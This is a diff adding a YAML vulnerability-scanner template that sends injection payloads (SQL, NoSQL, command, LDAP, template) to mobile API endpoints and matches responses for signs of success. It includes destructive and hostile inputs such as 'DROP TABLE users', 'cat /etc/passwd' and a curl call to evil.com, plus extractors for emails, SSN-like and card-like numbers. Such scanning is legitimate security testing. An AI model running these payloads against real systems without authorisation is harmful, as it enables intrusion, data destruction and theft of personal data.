@@ -1,0 +1,169 @@
+id: mobile-api-injection
+info:
+  name: Mobile API Injection Vulnerabilities
+  author: AmpSwiftUI
+  severity: critical
+  description: Tests for SQL, NoSQL, Command injection in mobile APIs
+  tags: mobile,api,injection,sqli,nosqli,rce
+
+variables:
+  sql_payloads:
+    - "' OR '1'='1"
+    - "1' AND '1'='2"
+    - "' UNION SELECT NULL--"
+    - "1; DROP TABLE users--"
+    - "' OR 1=1--"
+    - "admin'--"
+    
+  nosql_payloads:
+    - '{"$ne": null}'
+    - '{"$gt": ""}'
+    - '{"$regex": ".*"}'
+    - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    
+  command_payloads:
+    - "; ls -la"
+    - "| whoami"
+    - "`id`"
+    - "$(curl evil.com)"
+    - "; cat /etc/passwd"
+    
+  ldap_payloads:
+    - "*)(uid=*"
+    - "*)(|(uid=*"
+    - "admin*"
+    
+  template_payloads:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+
+http:
+  - raw:
+      # SQL Injection tests
+      - |
+        GET {{BaseURL}}/api/user?id={{sql_payloads}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MyApp/1.0 (com.example.myapp; build:1; iOS 17.0.0)
+        X-Device-Type: iPhone
+        Accept: application/json
+        
+      - |
+        POST {{BaseURL}}/api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: MyApp/1.0 (com.example.myapp; build:1; iOS 17.0.0)
+        X-Device-Type: iPhone
+        
+        {"username":"admin{{sql_payloads}}","password":"password"}
+        
+      # NoSQL Injection tests
+      - |
+        POST {{BaseURL}}/api/search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: aws-amplify/5.0.0 iOS/17.0
+        X-Device-Type: iPhone
+        
+        {"filter": {{nosql_payloads}}}
+        
+      # Command Injection tests
+      - |
+        POST {{BaseURL}}/api/process HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: MyApp/1.0 (com.example.myapp; build:1; iOS 17.0.0)
+        X-Device-Type: iPhone
+        
+        {"input":"test{{command_payloads}}"}
+        
+      # Template Injection tests
+      - |
+        POST {{BaseURL}}/api/template HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: MyApp/1.0 (com.example.myapp; build:1; iOS 17.0.0)
+        X-Device-Type: iPhone
+        
+        {"template":"Hello {{template_payloads}}"}
+        
+      # LDAP Injection tests
+      - |
+        GET {{BaseURL}}/api/ldap/search?user={{ldap_payloads}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MyApp/1.0 (com.example.myapp; build:1; iOS 17.0.0)
+        X-Device-Type: iPhone
+        Accept: application/json
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: sql-error
+        part: body
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-01756"
+          - "PostgreSQL"
+          - "SQLite"
+          - "Microsoft SQL Server"
+        condition: or
+        
+      - type: word
+        name: nosql-success
+        part: body
+        words:
+          - '"_id"'
+          - "ObjectId"
+          - "$oid"
+        condition: or
+        
+      - type: word
+        name: command-execution
+        part: body
+        words:
+          - "root:"
+          - "bin/bash"
+          - "uid="
+          - "/etc/passwd"
+        condition: or
+        
+      - type: word
+        name: template-execution
+        part: body
+        words:
+          - "49"
+          - "7777777"
+        condition: or
+        
+      - type: regex
+        name: error-based
+        part: body
+        regex:
+          - "error.*syntax"
+          - "warning.*mysql"
+          - "exception.*sql"
+          
+      - type: time
+        name: time-based
+        time: 5
+        
+    extractors:
+      - type: regex
+        name: database-type
+        part: body
+        regex:
+          - "MySQL.*[0-9]+\\.[0-9]+"
+          - "PostgreSQL.*[0-9]+\\.[0-9]+"
+          - "Microsoft SQL Server.*[0-9]+"
+          - "Oracle.*[0-9]+"
+          
+      - type: regex
+        name: sensitive-data
+        part: body
+        regex:
+          - "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"
+          - "\\b[0-9]{3}-[0-9]{2}-[0-9]{4}\\b"
+          - "\\b[0-9]{4}[\\s-]?[0-9]{4}[\\s-]?[0-9]{4}[\\s-]?[0-9]{4}\\b"
